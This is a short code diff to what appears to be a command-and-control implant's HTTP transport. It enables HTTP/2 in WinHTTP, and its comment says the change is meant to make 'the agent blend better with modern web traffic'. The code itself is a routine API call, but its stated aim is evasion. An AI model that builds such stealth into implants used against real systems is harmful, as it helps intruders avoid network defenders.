@@ -67,6 +67,21 @@ BOOL HttpSend(
             PRINTF_DONT_SEND( "WinHttpOpen: Failed => %d\n", NtGetLastError() )
             goto LEAVE;
         }
+
+        /* Enable HTTP/2 if supported (Windows 10 1607+)
+         * This allows the agent to blend better with modern web traffic.
+         * WinHTTP will automatically fall back to HTTP/1.1 on older systems
+         * or if the server doesn't support HTTP/2. */
+        DWORD enableHttp2 = WINHTTP_PROTOCOL_FLAG_HTTP2;
+        if ( ! Instance->Win32.WinHttpSetOption(
+            Instance->hHttpSession,
+            WINHTTP_OPTION_ENABLE_HTTP_PROTOCOL,
+            &enableHttp2,
+            sizeof( enableHttp2 )
+        ) ) {
+            /* HTTP/2 not available on this system - not fatal, continue with HTTP/1.1 */
+            PRINTF_DONT_SEND( "HTTP/2 not available: %d (falling back to HTTP/1.1)\n", NtGetLastError() )
+        }
     }
 
     /* PRINTF_DONT_SEND( "WinHttpConnect( %x, %ls, %d, 0 )\n", Instance->hHttpSession, Instance->Config.Transport.Host->Host, Instance->Config.Transport.Host->Port ) */
